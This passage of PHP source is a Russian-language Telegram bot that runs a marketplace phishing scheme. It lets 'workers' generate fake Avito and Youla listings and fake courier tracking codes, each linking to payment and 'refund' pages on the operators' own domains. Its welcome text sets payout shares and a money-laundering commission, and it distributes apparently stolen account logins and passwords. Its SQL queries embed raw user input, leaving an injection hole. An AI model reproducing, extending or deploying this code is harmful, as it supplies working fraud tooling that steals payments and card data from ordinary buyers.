				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => mySettings($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => mySettings($callback['from'], 1)));
			}

			if(preg_match('/\/profithide\//', $callback['type'])) {
				$query = mysqli_query($connection, "SELECT `hidden` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` > '0'");

				if(mysqli_num_rows($query) > 0) {
					$user = mysqli_fetch_assoc($query);

					if($user['hidden'] == 0) {
						mysqli_query($connection, "UPDATE `accounts` SET `hidden` = '1' WHERE `telegram` = '$callback[from]' AND `access` > '0'");
						$text = "👽 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>скрыл отображение своего своего профиля в залётах</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} elseif($user['hidden'] == 1) {
						mysqli_query($connection, "UPDATE `accounts` SET `hidden` = '0' WHERE `telegram` = '$callback[from]' AND `access` > '0'");
						$text = "👽 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>включил отображение своего своего профиля в залётах</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => mySettings($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => mySettings($callback['from'], 1)));
				}
			}

			if(preg_match('/\/getaccount\/(avito|youla)\//', $callback['type'])) {
				$history = mysqli_query($connection, "SELECT * FROM `free_history` WHERE `telegram` = '$callback[from]' AND `time` > '".(time()-3600)."'");

				if(mysqli_num_rows($history) > 0) {
					$text = "🎁 <b>Вы можете получить 1 бесплатный аккаунт раз в час</b>";
				} else {
					if(mb_substr($callback['type'], 12, -1) == 'avito') {
						$type = 0;
						$name = 'Авито';
					} elseif(mb_substr($callback['type'], 12, -1) == 'youla') {
						$type = 1;
						$name = 'Юла';
					}

					$accounts = mysqli_query($connection, "SELECT * FROM `free` WHERE `type` = '$type'");

					if(mysqli_num_rows($accounts) > 0) {
						$account = mysqli_fetch_assoc($accounts);

						$text = "🎁 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>получил бесплатный аккаунт сервиса $name</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						$text = "🎁 <b>Бесплатный аккаунт</b>\n\n";
						$text .= "Сервис: <code>$name</code>\n";
						$text .= "Логин: <code>$account[login]</code>\n";
						$text .= "Пароль: <code>$account[password]</code>\n";

						mysqli_query($connection, "DELETE FROM `free` WHERE `id` = '$account[id]'");
						mysqli_query($connection, "INSERT INTO `free_history` (`type`, `telegram`, `time`) VALUES ('$type', '$callback[from]', '".time()."')");
					} else {
						$text = "🥺 <b>В данный момент аккаунтов сервиса $name нет в наличии</b>";
					}
				}

				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}
		}

		if(isset($message)) {

			$query = mysqli_query($connection, "SELECT `username` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");

			if(mysqli_num_rows($query) > 0) {
				$user = mysqli_fetch_assoc($query);

				if($user['username'] != $message['username']) {
					mysqli_query($connection, "UPDATE `accounts` SET `username` = '$message[username]' WHERE `telegram` = '$message[from]'");

					if($message['username'] == '') $message['username'] = 'скрыт';

					$text = "👽 <a href=\"tg://user?id=$message[from]\">Воркер</a> <b>сменил свой ник с</b> <code>$user[username]</code> <b>на</b> <code>$message[username]</code>\n";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			// ====================== [ ЧАТ ВОРКЕРОВ ] ======================= //

			if($message['chat_id'] == $config['chat']['workers']) {
				if(isset($data->{'message'}->{'new_chat_member'})) {

					$query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");

					if(mysqli_num_rows($query) > 0) {
						$stake = explode(':', $settings['stake']);


                        $text = "💎 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> , приветствуем тебя в чате воркеров.\n\n";

                        $text.= "🔥 Для перехода в чат ТОПов тебе необходимо сделать профитов на сумму 30.000 ₽ с ней ты получишь новые возможности и никакой комиссии за отмыв средств!\n\n";

                        $text.= "💸 Выплаты:\n";
                        $text.= "    — Оплата и возврат до 5000 ₽ - выплата 50% без комиссии за отмыв.\n";
                        $text.= "    — Оплата свыше 5000 ₽ - выплата 80% + комиссия за отмыв.\n";
                        $text.= "    — Возврат свыше 5000 ₽ - выплата 70% без комиссии за отмыв.\n\n";


                        $text.= "💰 Канал с залетами: <a href=\"https://t.me/joinchat/AAAAAEdh0xyKuDYGEQf7PA\">Перейти</a> \n";
                        $text.= "🤖 Бот, который может всё:t\n\n";

                        $text.= "🗣 Общие вопросы:\n";
                        $text.= "💳 Финансовые вопросы: @bankir_bs\n\n";

                        $text.= "❗️Наши правила: /rules\n";
                        $text.= "❕Остальную информацию смотрите в боте - кнопка помощи\n";

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						$text = "🐣 <b>К чату воркеров присоединился</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {

					}
				}

				if(preg_match('/\/rules/i', $message['text']) == TRUE) {

				    $text = "🔰10 ПРАВИЛ 🔰\n\n";
						$text .= "<b>1.</b> Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков).\n";
						$text .= "<b>2.</b> Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы, всякого рода реклама так же запрещена.\n";
						$text .= "<b>3.</b> Запрещено обсуждать других ТСов.\n";
						$text .= "<b>4.</b> Если что-то не устраивает по поводу %, беседы и т.д. пишите Владельцу проекта , а не разводите флуд в чате.\n";
						$text .= "<b>5.</b> Запрещено узнавать у друг друга персональную информацию.\n";
						$text .= "<b>6.</b> Запрещено оскорблять администрацию.\n";
						$text .= "<b>7.</b> Запрещено попрошайничество в беседе воркеров.\n";
						$text .= "<b>8.</b> Администрация не несёт ответственности за блокировку кошельков/карт.\n";
						$text .= "<b>9.</b> Конфликты между собой решать в лс.\n";
						$text .= "<b>10.</b> Месяц без залётов, будем прощаться.\n";
				    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}


//=============== Топ 10 и 25 воркеров ===================//


				if(preg_match('/\/topworkers/i', $message['text']) == TRUE) {
					$payments = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS `amount`, COUNT(`id`) AS `count` FROM `payments` WHERE `worker` != '0' AND `status` = '1' GROUP BY `worker` ORDER BY SUM(`amount`) DESC LIMIT 10");

					$x = 0;
					$text = "🔝 <b>Топ 10 воркеров:</b>\n\n";
					while($row = mysqli_fetch_assoc($payments)) {
						$x = $x+1;
						$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `username` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
						if($user['username'] == '' OR $user['username'] == 'username') $user['username'] = 'Скрыт';
						$text .= "<b>$x. —</b> <a href=\"tg://user?id=$row[worker]\">$user[username]</a> — <code>$row[amount] RUB</code> — <code>". Endings($row['count'], "профит", "профита", "профитов") ."</code>\n";
					}

					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			// ==================== [ ЛИЧНЫЕ СООБЩЕНИЯ ] ===================== //

			if(substr($message['chat_id'], 0, 1) != '-') {
				$accounts = mysqli_query($connection, "SELECT `id`, `username`, `access` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'");

				if(mysqli_num_rows($accounts) > 0) {
					$user = mysqli_fetch_assoc($accounts);

					if($user['username'] != $message['username']) {
						mysqli_query($connection, "UPDATE `accounts` SET `username` = '$message[username]' WHERE `telegram` = '$message[from]'");

						$text = "👽 <a href=\"tg://user?id=$message[from]\">Работник</a> <b>сменил свой ник с</b> <code>$username[username]</code> <b>на</b> <code>$message[username]</code>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}

					$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$tracks = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
					$mails = mysqli_query($connection, "SELECT * FROM `mails` WHERE `worker` = '$message[from]' AND `status` = '0'");




					if(mysqli_num_rows($mails) > 0) {
					    $mails = mysqli_fetch_assoc($mails);

					    if(empty($mails['email'])) {

					        if($message['text'] == TRUE) {

					           mysqli_query($connection, "UPDATE `mails` SET `email`='$message[text]' WHERE `worker` = '$message[from]' AND `email`=''");

					           $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✅ Отправить', 'callback_data' => '/mail/send')))));

					           send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => 'Если вы готовы отправить нажмите на "✅ Отправить"', 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup'=>$keyboard));

					        }

					    }
					}


//================ Создать трекер или объявление =====================//


					if(mysqli_num_rows($adverts) > 0) {
						$advert = mysqli_fetch_assoc($adverts);

						if(empty($advert['title'])) {
							if(preg_match("/http/", $message['text']) == FALSE AND $message['text'] != '🛍 Юла' AND $message['text'] != '📦 Авито') {
								if(mb_strlen($message['text']) >= 5 AND mb_strlen($message['text'] <= 90)) {
									mysqli_query($connection, "UPDATE `adverts` SET `title` = '$message[text]' WHERE `id` = '$advert[id]'");

									$text = "🤑 <b>Введите сумму вашего товара</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "👺 <b>Название объявления не может быть короче 5 и длинее 90 символов</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "👺 <b>Введите корректное название объявления</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($advert['price'])) {
							if(preg_match('/^[0-9]{3,6}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
									mysqli_query($connection, "UPDATE `adverts` SET `price` = '$message[text]' WHERE `id` = '$advert[id]'");

									$text = "📷 <b>Укажите ссылку на изображение вашего товара</b>\n\n";
									$text .= "Вы можете воспользоваться ботом для загрузки изображения со своего устройства и получения ссылки на него, бот: <b>@imgurbot_bot</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "👺 <b>Сумма товара не может быть меньше $settings[min_price] RUB и больше $settings[max_price] RUB</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "👺 <b>Сумма товара не может быть меньше $settings[min_price] RUB и больше $settings[max_price] RUB</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($advert['image'])) {
							if(preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $message['text']) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $message['text']) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $message['text']) == TRUE) {
								mysqli_query($connection, "UPDATE `adverts` SET `image` = '$message[text]', `status` = '1', `time` = '".time()."' WHERE `id` = '$advert[id]'");

								$text = "📎 <b>Ваше объявление было сгенерировано</b>\n\n";
								$text .= "ID объявления: <code>$advert[advert_id]</code>\n";
								$text .= "Название товара: <code>$advert[title]</code>\n";
								$text .= "Сумма товара: <code>$advert[price] руб.</code>\n";
								$text .= "Сумма доставки: <code>$settings[delivery] руб.</code>";

								if($advert['type'] == 0) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['avito'].'/buy?id='.$advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['avito'].'/refund?id='.$advert['advert_id']))));
								} elseif($advert['type'] == 1) {
									$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://'.$domains['youla'].'/product/'.$advert['advert_id'].'/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://'.$domains['youla'].'/refund/'.$advert['advert_id']))));
								} else {
									$keyboard = Array('inline_keyboard' => Array(Array()));
								}

								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));

								$text = "📋 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал своё объявление</b>\n\n";
								$text .= "ID объявления: <code>$advert[advert_id]</code>\n";
								$text .= "Название товара: <code>$advert[title]</code>\n";
								$text .= "Сумма товара: <code>$advert[price] руб.</code>\n";
								$text .= "Сумма доставки: <code>$settings[delivery] руб.</code>";

								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							} else {
								$text = "👺 <b>Указана некорректная ссылка на изображение</b>\n\n";
								$text .= "Вставьте URL на своё изображение с вашего объявления на Авито или Юле, или воспользуйтесь ботом для загрузки изображения с вашего устройства, бот: <b>@imgurbot_bot</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} elseif(mysqli_num_rows($tracks) > 0) {
						$track = mysqli_fetch_assoc($tracks);

						if(empty($track['sender'])) {
							if(preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `sender` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите название отправляемого товара</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>ФИО отправителя введено некорректно</b>\n\n";
								$text .= "Пример: <i>Иванов Иван Иванович</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['product'])) {
							if(mb_strlen($message['text']) <= 50) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите имя курьера в формате Фамилия И. О. или 0, чтобы пропустить этот пункт</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Название отправляемого товара указано некорректно</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['courier']) AND $track['courier'] != '0') {
							if((preg_match('/\S{2,35} \S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 45) OR $message['text'] == 0) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `courier` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите вес товара в граммах</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Имя курьера введено некорректно</b>\n\n";
								$text .= "Пример: <i>Иванов И. И. (или введите 0, чтобы пропустить этот пункт)</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['weight'])) {
							if(preg_match('/^[0-9]+$/i', $message['text']) == TRUE) {
								if(strlen($message['text']) >= 4) {
									$weight = round($message['text'], -2)/1000 . ' кг';
								} else {
									$weight = $message['text'].' гр';
								}

								mysqli_query($connection, "UPDATE `trackcodes` SET `weight` = '$weight' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Укажите сумму товара с учётом доставки</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Вес товара указан некорректно</b>\n\n";
								$text .= "Пример: <i>1200</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['amount'])) {
							if(preg_match('/^[0-9]{3,6}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {
									mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$message[text]' WHERE `id` = '$track[id]'");

									$text = "🤟 <b>Укажите комплектацию товара</b>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = "😳 <b>Сумма товара не может быть меньше</b> <code>$settings[min_price] руб.</code> <b>и больше</b> <code>$settings[max_price] руб.</code>";
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = "😳 <b>Сумма товара не может быть меньше</b> <code>$settings[min_price] руб.</code> <b>и больше</b> <code>$settings[max_price] руб.</code>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['equipment'])) {
							if((mb_strlen($message['text']) <= 250 AND mb_strlen($message['text']) >= 2)) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `equipment` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите ФИО получателя</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Комплектация товара указана некорректно</b>\n\n";
								$text .= "Пример: <i>Зарядное устройство, Инструкция</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['recipient'])) {
							if(preg_match('/\S{2,35} \S{2,35}/i', $message['text']) == TRUE AND mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `recipient` = '".ucwords($message['text'])."' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите город получателя</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>ФИО получателя введено некорректно</b>\n\n";
								$text .= "Пример: <i>Иванов Иван Иванович</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['city'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `city` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите город отправителя</b>\n\n";
								$text .= "Пример: <i>Санкт-Петербург</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Город получателя указан некорректно</b>\n\n";
								$text .= "Пример: <i>Санкт-Петербург</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['from_city'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `from_city` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "📅 Введите примерную дату доставки\n\n";
								$text .= "Пример: <i>" . date("d.m.Y") . "</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Город отправителя указан некорректно</b>\n\n";
								$text .= "Пример: <i>Санкт-Петербург</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['date_pick'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `date_pick` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "🤟 <b>Введите адрес получателя</b>\n\n";
								$text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Адрес получателя указан некорректно</b>\n\n";
								$text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['address'])) {
							if(mb_strlen($message['text']) <= 100) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `address` = '$message[text]' WHERE `id` = '$track[id]'");

								$text = "📞 <b>Введите номер телефона получателя</b>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "😤 <b>Адрес получателя указан некорректно</b>\n\n";
								$text .= "Пример: <i>197349, г. Санкт-Петербург, ул. Байконурская, д.26</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['phone'])) {
							if(preg_match('/\+{0,1}\d{11}/i', $message['text']) == TRUE OR preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
								if(preg_match('/\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}/i', $message['text']) == TRUE) {
									$edit = $message['text'];
								} else {
									$phone = str_replace('+', '', $message['text']);
									$edit = '+'.substr($phone, 0, 1).' ('.substr($phone, 1, 3).') '.substr($phone, 4, 3).'-'.substr($phone, 7, 2).'-'.substr($phone, 9, 2);
								}

								mysqli_query($connection, "UPDATE `trackcodes` SET `phone` = '$edit', `status` = '1' WHERE `id` = '$track[id]'");

								if($track['type'] == 0) $platform = 'Боксберри';
								if($track['type'] == 1) $platform = 'СДЭК';
								if($track['type'] == 2) $platform = 'ПЭК';
								if($track['type'] == 3) $platform = 'Почта РФ';

								$text = "🎟 <b>Ваш трек-код успешно сгенерирован</b>\n\n";
								$text .= "Трек-код: <code>$track[code]</code>\n";
								$text .= "Платформа: <code>$platform</code>\n";
								$text .= "Название товара: <code>$track[product]</code>\n";
								$text .= "Сумма товара: <code>$track[amount] руб.</code>\n";
								$text .= "Статус: <code>Ожидает оплаты</code>\n";

								$keyboard = Array('inline_keyboard' => Array(Array()));

								if($track['type'] == 0) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['boxberry'].'/track?track_id='.$track['code']),Array('text' => '📋 Возврат', 'url' => 'https://'.$domains['boxberry'].'/refund?id='.$track['code'])));
								} elseif($track['type'] == 1) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['cdek'].'/track?track_id='.$track['code']),Array('text' => '📋 Возврат', 'url' => 'https://'.$domains['cdek'].'/refund.php?id='.$track['code'])));
								} elseif($track['type'] == 2) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['pec'].'/track?track_id='.$track['code']),Array('text' => '📋 Возврат', 'url' => 'https://'.$domains['pec'].'/refund?id='.$track['code'])));
								} elseif($track['type'] == 3) {
									array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://'.$domains['pochta'].'/track?track_id='.$track['code']),Array('text' => '📋 Возврат', 'url' => 'https://'.$domains['pochta'].'/refund?id='.$track['code'])));
								} else {
									$keyboard = Array('inline_keyboard' => Array(Array()));
								}

								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));


								$text = "🎟 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал трек-код</b>\n\n";
								$text .= "Трек-код: <code>$track[code]</code>\n";
								$text .= "Платформа: <code>$platform</code>\n";
								$text .= "Название товара: <code>$track[product]</code>\n";
								$text .= "Сумма товара: <code>$track[amount] руб.</code>\n";


								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$text = "😤 <b>Номер телефона получателя указан некорректно</b>\n\n";
								$text .= "Пример: <i>+79455553535</i>";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					}

					if($message['text'] == '/help') {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showCommands(1)));
					}


//============= Добавить или изменить сумму доставки ==================//




					if(preg_match('/^\/setdelivery/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setdelivery ([a-z0-9]{24}|\d+);[0-9]{3,5}$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 13));

							$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `worker` = '$message[from]'");

							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);

								if($advert['worker'] == $message['from']) {
									mysqli_query($connection, "UPDATE `adverts` SET `delivery` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

									$text = "🚚 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму доставки на</b> <code>$edit[1] руб.</code>\n\n";
									$text .= "https://avito.ru/";
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = "🚚 <b>Вы изменили сумму доставки с до</b> <code>$edit[1] руб.</code>\n\n";

									if($advert['type'] == 0) {
										$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
										$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
									} elseif($advert['type'] == 1) {
										$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
										$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
									}
								} else {
									$text = "🚚 <b>Объявление закреплено не за вашим аккаунтом</b>";
								}
							} else {
								$text = "🚚 <b>Объявление с таким ID не было найдено</b>";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /setdelivery <code>[ID объявления];[Сумма]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}




//============= Добавить или изменить сумму товара =================//



					if(preg_match('/^\/setprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setprice ([0-9]+|[a-z0-9]{24});\d{3,5}$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));

